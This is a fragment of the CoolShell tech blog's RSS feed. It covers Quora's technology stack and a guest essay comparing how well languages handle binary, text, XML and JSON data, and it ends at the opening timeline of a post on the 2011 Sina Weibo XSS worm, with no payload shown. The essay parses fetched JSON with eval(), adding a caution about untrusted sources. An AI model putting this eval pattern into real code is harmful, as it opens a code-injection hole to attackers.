+<p><a href="http://incubator.apache.org/thrift/">Thrift</a> 用于后端服务器间的通讯。Thrift  服务由 C++开发。<a href="https://coolshell.cn/articles/4549.html" target="_blank">Facebook同样使用了这个技术</a>。</p>
+<p><strong>参考</strong>：<a href="http://www.quora.com/Why-would-you-write-a-Thrift-service-in-C"><img decoding="async" loading="lazy" src="http://www.quora.com/favicon.ico" alt="" width="16" height="16" />Why would you write a Thrift service in C++?</a></p>
+<h4 id="tornado">Tornado</h4>
+<p><a href="http://www.tornadoweb.org/">Tornado</a> web 框架用于实时更新，其运行在Comet 服务器上，其用来处理大量的需要长时间poll和push更新的网络连接。</p>
+<h4 id="long-polling-comet">Long Polling (Comet)</h4>
+<p>Quora的网页并不是简单的显示，每一个页面都需要更新，或是创建问题，答案和评论。所以，他们使用了Long Polling而不是传统的Polling，传统的Polling需要浏览器一端不停地重复地向服务器询问——“有更新吗？”，服务器说没有，于是过一会浏览大再问，现在呢？服务器说，还是没有，浏览器过一会又问，现在呢？服务器说，还没好。这样一来，就好像让我们的客户端放到了驾驶室里，这显然是有问题的，因为只有服务器知道什么时候会有更新。而且浏览器这么干，很快会让服务器的负载加上去。</p>
+<p>Long polling 也就是我们熟知的 <a href="http://en.wikipedia.org/wiki/Comet_(programming)">Comet</a>，其让服务器来控制这些事，让客服端等在那里听服务器的响应。在client和 server的会话对于两者是是相同的，而不是client需要等着然后向服务器查询。服务器端可以把一个连接打开很长时间（比如：60秒），在这段时间里，服务器会查看是否有相应的东西需要更新，如果有的话，就发给浏览器。如果没有的话，就等下一次的client询问。可见，这种服务器等一会再响应的方法可以让浏览器少发几次查询。</p>
+<p>对于long-polling 的最好的地方是，可以降低浏览器和客户端间来来回回的次数。让服务器端来控制时间，所以，内容更新可能会只是几个毫秒，或是几十秒。 服务器端也可以积攒一堆更新后，一次发给浏览器。这样做会更有效率。</p>
+<p>但是，这个方法的黑暗面是——这会让服务器端出现大量的TCP链接，想一想，Quora也是百万级用户的应用了，只需要10%的在线用户，你就需要一个可以处理10万并发量的架构。注意，如果一个用户在其浏览器里打开了多个Quora网页的话，那么，这个链接器会是非常致命的。</p>
+<p>当然，好的消息是已经有一些技术专门为Long Polling设计，这些技术可以让你在那些等待的连接中只会消耗非常非常少的内存（因为那些等待连接并不需要所有的资源）。例如：Nginx 是一个单线程的事件驱动的小型服务器，每一个链接只花非常小的内存。每一个Nginx的进程只会在一个时候处理一个连接。这意味着其很容易扩展成一个可以处理成千上的并发量的服务架构。</p>
+<p><strong>参考</strong>：<a href="http://www.quora.com/How-do-you-push-messages-back-to-a-web-browser-client-through-AJAX-Is-there-any-way-to-do-this-without-having-the-client-constantly-polling-the-server-for-updates"><img decoding="async" loading="lazy" src="http://www.quora.com/favicon.ico" alt="" width="16" height="16" />How do you push messages back to a web-browser client through AJAX? Is there any way to do this without having the client constantly polling the server for updates?</a></p>
+<h4 id="mysql">MySQL</h4>
+<p>就像Adam D’Angelo 的老东家facebook一样，，Quora重度使用MySQL。对于，把数据库里的数据分区是最需要做的事。他们的行事原则是，尽可能的把数据放在一台机器上，使用hash主键把大规模的数据存放到多个数据库中。坚决不用表连接。Adam参考了FriendFeed的一篇文章<a href="http://bret.appspot.com/entry/how-friendfeed-uses-mysql">How FriendFeed uses MySQL to store schema-less data</a>，<a href="http://www.quora.com/NoSQL/In-what-parts-of-a-social-site-with-concert-listings-should-one-use-a-NoSQL-DB-versus-a-SQL-DB">并说</a>你不应该在你的社区还没有100万用户的时候使用NoSQL 数据库。</p>
+<p>并不只是Quora和FriendFeed使用MySQL，Google，Twitter，Facebook都在使用MySQL.</p>
+<p>参考：<a href="http://www.quora.com/How-does-one-evaluate-if-a-database-is-efficient-enough-to-not-crash-as-its-put-under-increasing-load"><img decoding="async" loading="lazy" src="http://www.quora.com/favicon.ico" alt="" width="16" height="16" />How does one evaluate if a database is efficient enough to not crash as it’s put under increasing load?</a></p>
+<h4 id="memcached">Memcached</h4>
+<p><a href="http://memcached.org/">Memcached</a> 用于 MySQL的前端缓存。</p>
+<h4 id="git">Git</h4>
+<p><a href="http://git-scm.com/">Git</a> <a href="http://www.quora.com/What-languages-and-frameworks-were-used-to-code-Quora">是他们的源码版本控制工具</a>.</p>
+<h4 id="javascript-placement">JavaScript Placement</h4>
+<p>如果你看一下Quora的网页源码，你会看到其JavaScript总是在页面的最后。 Charlie Cheever<a href="http://www.quora.com/Why-is-the-Quora-website-so-fast">建议</a> 这会让你的页面显得载入得很快，因为其先显示内容，然后在载入Javascript。</p>
+<h4 id="charlie-cheever-follows-14-rules-for-faster-loading-web-sites">Charlie Cheever 遵从 “14 Rules for Faster-Loading Web Sites”</h4>
+<p>Steve Souders,  High Performance Web Sites 和 Even Faster Web Sites的作者，其列了一些 <a href="http://stevesouders.com/hpws/rules.php">rules让你网页更快的原则</a>。 Charlie Cheever 的 Quora 创始人提到这些过，这应该也是Quora的速度的原因。</p>
+<blockquote><p>“One resource we used as a guide is Steve Souders’ list of rules for high performance websites:<a href="http://stevesouders.com/hpws/rules.php">http://stevesouders.com/hpws/rules.php</a>”<br />
+<small><a href="http://www.quora.com/Why-is-the-Quora-website-so-fast">– Charlie Cheever, Quora</a></small></p></blockquote>
+<div>
+<div>Steve Souders的14条规则是——<a href="http://www.amazon.com/gp/product/0596529309?ie=UTF8&amp;tag=getafil-20&amp;linkCode=as2&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0596529309"><img decoding="async" class="alignright" src="https://images-na.ssl-images-amazon.com/images/I/41COtT-V1UL._SL160_.jpg" border="0" alt="" /></a><a href="http://www.amazon.com/gp/product/0596522304?ie=UTF8&amp;tag=getafil-20&amp;linkCode=as2&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0596522304"><br />
+</a>&nbsp;</p>
+<ul>
+<li>Make Fewer HTTP Requests</li>
+<li>Use a Content Delivery Network</li>
+<li>Add an Expires Header</li>
+<li>Gzip Components</li>
+<li>Put Stylesheets at the Top</li>
+<li>Put Scripts at the Bottom</li>
+<li><a href="http://www.amazon.com/gp/product/0596522304?ie=UTF8&amp;tag=getafil-20&amp;linkCode=as2&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0596522304"><img decoding="async" class="alignright" src="https://images-na.ssl-images-amazon.com/images/I/41vfOvQugoL._SL160_.jpg" border="0" alt="" /></a>Avoid CSS Expressions</li>
+<li>Make JavaScript and CSS External</li>
+<li>Reduce DNS Lookups</li>
+<li>Minify JavaScript</li>
+<li>Avoid Redirects</li>
+<li>Remove Duplicate Scripts</li>
+<li>Configure ETags</li>
+<li>Make AJAX Cacheable</li>
+</ul>
+</div>
+</div>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/4549.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/7.jpg" alt="Facebook 的系统架构" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4549.html" class="wp_rp_title">Facebook 的系统架构</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/18140.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/09/react_patent-360x200-1-150x150.jpg" alt="关于Facebook 的 React 专利许可证" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18140.html" class="wp_rp_title">关于Facebook 的 React 专利许可证</a></li><li ><a href="https://coolshell.cn/articles/11265.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/03/snake-hat-new-year-schedule-800x960-150x150.jpg" alt="Python修饰器的函数式编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11265.html" class="wp_rp_title">Python修饰器的函数式编程</a></li><li ><a href="https://coolshell.cn/articles/10822.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/12/yoda-lambda-150x150.png" alt="函数式编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10822.html" class="wp_rp_title">函数式编程</a></li><li ><a href="https://coolshell.cn/articles/10169.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="类型的本质和函数式实现" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10169.html" class="wp_rp_title">类型的本质和函数式实现</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4939.html">Quora使用到的技术</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4939.html/feed</wfw:commentRss>
+			<slash:comments>48</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>语言的数据亲和力</title>
+		<link>https://coolshell.cn/articles/4905.html</link>
+					<comments>https://coolshell.cn/articles/4905.html#comments</comments>
+		
+		<dc:creator><![CDATA[Todd]]></dc:creator>
+		<pubDate>Wed, 29 Jun 2011 00:10:44 +0000</pubDate>
+				<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[C++]]></category>
+		<category><![CDATA[Groovy]]></category>
+		<category><![CDATA[Java]]></category>
+		<category><![CDATA[JSON]]></category>
+		<category><![CDATA[XML]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4905</guid>
+
+					<description><![CDATA[<p>[ 感谢 Todd 同学投递本文 ] 目前，程序设计语言似乎进入了一个蓬勃发展的时期，Javascript、Perl、Python、Ruby、Groovy等一批...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4905.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4905.html">语言的数据亲和力</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><strong>[ 感谢 <a href="http://www.cnblogs.com/weidagang2046/" target="_blank">Todd 同学</a>投递本文 ]</strong></p>
+<p><span style="font-family: 'Lucida Console';">目前，程序设计语言似乎进入了一个蓬勃发展的时期，Javascript、Perl、Python、Ruby、Groovy等一批较新的语言正越来越多地被熟悉和使用，而C++、C#、Java等主流语言也在不断地融入函数式和动态性特征。程序员的百宝箱中可供选择的宝贝是越来多了，而社区中关于语言间的比较和争论也更为热烈，我们常常见到关于“面向过程和面向对象的比较”、“动态语言和静态语言的比较”、“命令式和函数式范式的比较”等比较。我注意到这类讨论的关注点多集中于设计相关话题，如“动态语言的Duck typing多态和静态语言的继承多态的比较”，“Prototype based和Class based的比较”等。但我认为还有一个十分重要的方面值得关注，这就是数据处理。</span></p>
+<p><span style="font-family: 'Lucida Console';">数据处理之所以重要是因为不论是本地信息存储还是系统间信息交换都需要建立在一定的数据格式基础上。另外，不管语言属于那种范式，设计上采用什么模式，在微观层次上程序很大一部分工作都是在做数据处理。所以，从数据处理角度比较和理解语言间的差异有重要的现实意义。虽然数据通常是平台和语言无关的，但不同的语言在处理某种格式的数据时会表现出不同的难度，甚至某些数据格式只能采用特定的语言才能实现，这就是数据亲和力的不同。</span></p>
+<p><span style="font-family: 'Lucida Console';">语言的数据亲和力(Data Affinity)指的是语言的数据模型与某种数据格式之间的匹配程度。语言对某种数据格式亲和力越强，则操作某类数据越容易。</span></p>
+<p>&nbsp;</p>
+<h4><strong><span style="font-family: 'Lucida Console';">二进制字节块格式</span></strong></h4>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><span style="font-family: 'Lucida Console';">在偏底层的操作系统、嵌入式和通信系统中，二进制的字节块是最常见的一种数据格式。二进制数据布局紧凑和接近机器的特点使得它常常作为系统间通信或系统文件的数据格式，但一般高级语言都不方便直接和0101打交道，而是基于记录、结构体和类等结构化表示操作数据，这就存在着在底层的二进制字节块和高层的结构化数据直接的转换问题。</span></p>
+<p><span style="font-family: 'Lucida Console';"><span id="more-4905"></span><br />
+</span></p>
+<p><span style="font-family: 'Lucida Console';">C语言作为最主要的系统语言具有很高的字节块数据亲和力。这不仅因为C语言具有指针可以直接访问内存以外，还因为C的结构体(struct)可以和字节块建立起直接的映射关系。例如，在基于Socket连接的分布式系统中服务器端和客户端通过二进制的字节数据进行通信，通信双方只要事先定义共用的结构体，发送方先创建相应的结构体变量并填充字段，然后把变量对应的内存块copy到Socket，接收方从Socket读取字节块，然后把字节块强制类型转换为相应的结构体指针即可读取个字段信息。整个过程中通信的双方都没有复杂的信息编码和解码的过程。示例代码如下：</span></p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">struct t_data {
+    int version;
+    char type[10];
+    float value;
+};
+
+//发送方
+struct t_data data;
+data.version = 1;
+strcpy(data.type,  “degree”);
+data.value = 189.0;
+send(socket,  &amp;data,  sizeof(data));
+
+//接收方
+struct t_data data;
+read(socket,  &amp;data,  sizeof(data));
+printf(“%d, %s, %f”, data.version,  data.type, data.value);</pre>
+<p>&nbsp;</p>
+<p><span style="font-family: 'Lucida Console';">上面的方法在实际应用中还需要注意内存对齐问题和大小端问题。内存对齐问题可以通过编译器预处理命令来进行控制，保证内存中struct结构与传输的字节块具有相同的对齐方式；大小端问题需要通信的双方采用同样的大小端方式，否则就需要进行转换。</span></p>
+<p><span style="font-family: 'Lucida Console';">C++可以完全兼容C的结构体，但C++的类(包括class和struct)中如果定义了虚函数，则会丧失结构的字节块数据亲和力，这是C++编程时需要权衡的一个因素。而除了C/C++，其他语言中则难以见到字节块数据亲和力，其原因在于C/C++允许控制结构体/对象的内存布局，并允许对指针进行非类型安全的强制类型转换，这都是在Java，C#等语言中不允许的。所以，在Java、C#中进行字节块的编码解码就只能按照协议一个字段一个字段地按偏移量和长度进行解析。C/C++的指针以及结构体和内存的直接映射带来了对字节块数据的亲和力，但同时也留下了内存访问和类型安全的隐患；而Java、C#在拥有引用安全和类型安全的同时也失去了对字节块数据的亲和力。</span></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h4><span style="font-family: 'Lucida Console';"><strong>文本格式</strong> </span></h4>
+<p><span style="font-family: 'Lucida Console';">文本格式是另一种十分常见的数据格式。《Unix编程艺术》中是这样描述文本格式的：&#8221;Text streams are a valuable universal format because they&#8217;re easy for human beings to read, write, and edit without specialized tools ”。基于文本流的管道处理是一种备受赞誉的Unix风格。Shell可以通过管道把各种功能单一的命令串联起来，让文本流在管道上流动，因而Shell语言具有很好的文本数据亲和力。许多文本数据处理任务Bash都可以一行搞定，这就是Hacker们酷爱的One Liner风格。</span></p>
+<p>&nbsp;</p>
+<p><span style="font-family: 'Lucida Console';">下面我们来看两个用Bash进行文本处理的例子：</span></p>
+<p><span style="font-family: 'Lucida Console';">1. 统计当前目录下的gz文件数目：</span></p>
+<p><code data-enlighter-language="shell" class="EnlighterJSRAW">ls –l *.gz | wc –l</code></p>
+<p>&nbsp;</p>
+<p><span style="font-family: 'Lucida Console';">2. 在Web服务器日子service.log中统计2011年6月26和27两天中每天中各页面的PV</span></p>
+<p><code data-enlighter-language="shell" class="EnlighterJSRAW">cat service.log | grep  ^2011-06-2[6-7] | cut –d ‘ ‘ –f 1, 3 | sort | uniq –c</code></p>
+<p>&nbsp;</p>
+<p>service.log:</p>
+<p style="padding-left: 30px;"><span style="font-family: 'Lucida Console';">2011-06-25 13:00:55 /music/c.htm Safari<br />
+…<br />
+2011-06-26 08:01:23 /main.htm IE<br />
+2011-06-26 08:03:01 /sports/b.htm Chrome<br />
+…<br />
+2011-06-27 11:41:06 /main.htm IE<br />
+2011-06-27 11:52:41 /news/a.htm Firefox</span></p>
+<p>&nbsp;</p>
+<p><span style="font-family: 'Lucida Console';">输出:</span></p>
+<p style="padding-left: 30px;"><span style="font-family: 'Lucida Console';">210 2011-06-26 /main.htm<br />
+231 2011-06-26 /news/a.htm<br />
+155 2011-06-26 /sports/b.htm<br />
+288 2011-06-27 /main.htm<br />
+292 2011-06-27 /news/a.htm<br />
+161 2011-06-27 /sports/b.htm</span></p>
+<p>&nbsp;</p>
+<p><span style="font-family: 'Lucida Console';">上面的两个简单文本数据处理任务如果是在C或C++下实现则要麻烦得多，代码量至少是十几行或者数十行，加上编译调试，整个开发效率可能比Shell低一个数量级。除了Shell外，Perl也是以强大的文本数据处理而闻名的。我们来看一个Perl正则表达式的例子：</span></p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">while (&lt;STDIN&gt;) {
+    if (/hello\s(\w+)/i)  {
+        print “say hello to $1“
+     }
+     elsif (/goodbye\s(\w+)/i)  {
+         print “say goodbye to  $1”
+    }
+}</pre>
+<p><span style="font-family: 'Lucida Console';">输入：</span></p>
+<p style="padding-left: 30px;">HeLLo world</p>
+<p style="padding-left: 30px;">Goodbye bug</p>
+<p><span style="font-family: 'Lucida Console';">输出：</span></p>
+<p style="padding-left: 30px;">say hello to world</p>
+<p style="padding-left: 30px;">say goodbye to bug</p>
+<p><span style="font-family: 'Lucida Console';">上面的例子中我们看到Perl直接进行字符串匹配并进行数据提取的强大威力。Perl基于正则表达式的字符串处理不仅比C/C++等系统语言更强大，甚至比Python这样的动态语言也更强大和更方便，这是因为正则表达式是Perl语言的“一等公民”，这就使得Perl比其他以库的方式支持正则表达式功能的语言具有更好的文本数据亲和力。后来的Ruby也学习Perl把直接在语言上支持正则表达式。</span></p>
+<p>&nbsp;</p>
+<h4><strong><span style="font-family: 'Lucida Console';">结构化文本格式</span></strong></h4>
+<p><span style="font-family: 'Lucida Console';">XML是最近十几年来流行起来的一种通用（半）结构化的文本数据交换格式。XML除具有一般文本格式的优点外，还具有表达复杂的层次信息的优势，所以它至诞生以来就被大量用于配置文件和各种Web Service中。现代程序设计基本都少不了了XML打交道，不过在C++、Java和C#集中静态类型语言中处理XML却并不是一件十分轻松的事情。我们先来看一个Java解析和构建下面这个XML的例子：</span></p>
+<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;langs type=&quot;current&quot;&gt;
+  &lt;language&gt;Java&lt;/language&gt;
+  &lt;language&gt;Groovy&lt;/language&gt;
+  &lt;language&gt;JavaScript&lt;/language&gt;
+&lt;/langs&gt;</pre>
+<p>&nbsp;</p>
+<pre data-enlighter-language="java" class="EnlighterJSRAW">//Java解析XML
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+try {
+    DocumentBuilder db = dbf.newDocumentBuilder();
+    Document doc = db.parse(&quot;src/languages.xml&quot;);
+    Element langs = doc.getDocumentElement();
+    System.out.println(&quot;type = &quot; + langs.getAttribute(&quot;type&quot;));
+    NodeList list = langs.getElementsByTagName(&quot;language&quot;);
+    for(int i = 0 ; i &amp;lt; list.getLength();i++) {
+        Element language = (Element) list.item(i);
+        System.out.println(language.getTextContent());
+    }
+}catch(Exception e) {
+    e.printStackTrace();
+}
+
+//Java创建XML
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+try {
+    DocumentBuilder db = dbf.newDocumentBuilder();
+    Document doc = db.newDocument();
+    Element langs = doc.createElement(&quot;langs&quot;);
+    langs.setAttribute(&quot;type&quot;, &quot;current&quot;);
+    doc.appendChild(langs);
+
+    Element language1 = doc.createElement(&quot;language&quot;);
+    Text text1 = doc.createTextNode(&quot;Java&quot;);
+    language1.appendChild(text1);
+    langs.appendChild(language1);
+
+    Element language2 = doc.createElement(&quot;language&quot;);
+    Text text2 = doc.createTextNode(&quot;Groovy&quot;);
+    language2.appendChild(text2);
+    langs.appendChild(language2);
+    Element language3 = doc.createElement(&quot;language&quot;);
+    Text text3 = doc.createTextNode(&quot;JavaScript&quot;);
+    language3.appendChild(text3);
+    langs.appendChild(language3);
+} catch (Exception e) {
+    e.printStackTrace();
+}</pre>
+<p><span style="color: #800040; font-family: 'Lucida Console';"><br />
+</span> 为了解析和创建小小的一段XML代码需要编写如此冗长的Java代码，而实现同样的功能动态语言Groovy则十分简洁：</p>
+<pre data-enlighter-language="groovy" class="EnlighterJSRAW">//Groovy解析XML
+def langs = new XmlParser().parse(&quot;languages.xml&quot;)
+println &quot;type = ${langs.attribute(&quot;type&quot;)}&quot;
+langs.language.each{
+    println it.text()
+}
+//Groovy创建XML
+def xml = new groovy.xml.MarkupBuilder()
+xml.langs(type:&quot;current&quot;){
+   language(&quot;Java&quot;)
+   language(&quot;Groovy&quot;)
+   language(&quot;JavaScript&quot;)
+}</pre>
+<p>&nbsp;</p>
+<p><span style="font-family: 'Lucida Console';">上面Groovy操作XML的代码简洁而富有表达力，代码与XML几乎是一一对应的，如同直接在XML上进行操作的DSL一样，而相应的Java代码则看不到XML的影子。这说明Groovy具有很高的XML数据的亲和力。为什么Java和Groovy在XML亲和力方面有这样的差异呢？原因在于Java要求所有的方法和属性都必须先定义再调用，严格的静态类型检查使得Java只能把XML元素作为“二等公民”来表达；而Groovy则没有静态类型检查的限制，可以自由地使用方法和属性来表达XML结构。上面用Groovy创建XML的例子中，groovy.xml.MarkupBuilder类中实际上并没有langs, language这些方法，但会在调用的时候自动创建相应的XML结构。</span></p>
+<p>&nbsp;</p>
+<p><span style="font-family: 'Lucida Console';">除了XML外，JSON是另一种通用的半结构化的纯文本数据交换格式，它常被视为轻量级的XML。JSON的本意是Javascript的对象表示(Javascript Object Notation)，它属于Javascript的语法子集，所以Javascript对JSON有原生的支持。下面就是一个在Javascript中创建JSON对象的例子：</span></p>
+<p>[javascript]var json = { “langs” :<br />
+    {<br />
+        &quot;type” : &quot;current”,<br />
+       &quot;language” :  [&quot;Java”, &quot;Groovy”, &quot;Javascript”]<br />
+    }<br />
+}[/javascript]</p>
+<p><span style="font-family: 'Lucida Console';">许多Javascript程序都会通过AJAX都从服务器获取JSON字符串，然后把字符串解析为JSON对象。由于Javascript对JSON的原生支持，所以，在Javascript中解析JSON字符串可以采用通用的eval方式，如：</span></p>
+<p>[javascript]var json = eval(“(&quot; +  jsonStr + “)&quot;);</p>
+<p>alert(json.langs.type);[/javascript]</p>
+<p><span style="font-family: 'Lucida Console';">甚至可以：</span></p>
+<p>[javascript]eval(“var json = ” +  jsonStr);</p>
+<p>alert(json.langs.type);[/javascript]</p>
+<p>&nbsp;</p>
+<p><span style="font-family: 'Lucida Console';">不过eval的通用性带来了一定的安全隐患，所以一般只建议对受信任的数据源采用eval方式解析JSON，对于不受信任的数据源可以采用专门的JSON解析库。无论如何Javascript对JSON的原生支持都使得Javascript创建和解析JSON数据十分的简单，也就是说Javascript具有很高的JSON数据亲和力。另外，Groovy 1.8也加入了对JSON的原生支持，操作JSON与Javascript一样方便。</span></p>
+<h4><strong><span style="font-family: 'Lucida Console';">总结</span></strong></h4>
+<p><span style="font-family: 'Lucida Console';">到这里为止本文篇幅已经很长了，只能列举二进制字节块格式、文本格式和结构化文本格式3种典型的数据格式。实际上，数据亲和力的话题还有很多值得探讨的，比如C#的Linq。本文的探讨算是抛砖引玉，目的在于引起大家注意在比较语言的时候不要忽略了数据亲和力这样一个重要方面。本文的错误或不足，敬请指正，谢谢！</span><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/03/rust-social-wide-150x150.jpg" alt="Rust语言的编程范式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/8088.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/7.jpg" alt="对技术的态度" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8088.html" class="wp_rp_title">对技术的态度</a></li><li ><a href="https://coolshell.cn/articles/7992.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/cpp_small-150x150.jpg" alt="C++的坑真的多吗？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7992.html" class="wp_rp_title">C++的坑真的多吗？</a></li><li ><a href="https://coolshell.cn/articles/5576.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/10/00.QuickBasic_PDS_IDE-150x150.png" alt="那些曾伴我走过编程之路的软件" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5576.html" class="wp_rp_title">那些曾伴我走过编程之路的软件</a></li><li ><a href="https://coolshell.cn/articles/4990.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/07/programmer-150x150.png" alt="程序员技术练级攻略" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4990.html" class="wp_rp_title">程序员技术练级攻略</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4905.html">语言的数据亲和力</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4905.html/feed</wfw:commentRss>
+			<slash:comments>31</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>新浪微博的XSS攻击</title>
+		<link>https://coolshell.cn/articles/4914.html</link>
+					<comments>https://coolshell.cn/articles/4914.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 28 Jun 2011 15:10:18 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[业界新闻]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[Sina]]></category>
+		<category><![CDATA[Weibo]]></category>
+		<category><![CDATA[XSS]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4914</guid>
+
+					<description><![CDATA[<p>今天晚上（2011年6月28日），新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4914.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4914.html">新浪微博的XSS攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>今天晚上（2011年6月28日），新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，“让女人心动的100句诗歌”，“3D肉团团高清普通话版种子”，“这是传说中的神仙眷侣啊”，“惊爆!范冰冰艳照真流出了”等等微博和私信，并自动关注一位名为hellosamy的用户。</p>
+<p>事件的经过线索如下：</p>
+<ul>
+<li>20:14，开始有大量带V的认证用户中招转发蠕虫</li>
+<li>20:30，2kt.cn中的病毒页面无法访问</li>
+<li>20:32，新浪微博中hellosamy用户无法访问</li>
+<li>21:02，新浪漏洞修补完毕</li>
+</ul>
+<p style="text-align: center;">&nbsp;</p>
+<figure id="attachment_4915" aria-describedby="caption-attachment-4915" style="width: 583px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-4915 " title="新浪微博XSS事件" src="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01.png" alt="新浪微博XSS事件" width="583" height="148" srcset="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01.png 729w, https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-300x76.png 300w, https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-604x153.png 604w" sizes="(max-width: 583px) 100vw, 583px" /><figcaption id="caption-attachment-4915" class="wp-caption-text">新浪微博XSS事件</figcaption></figure>
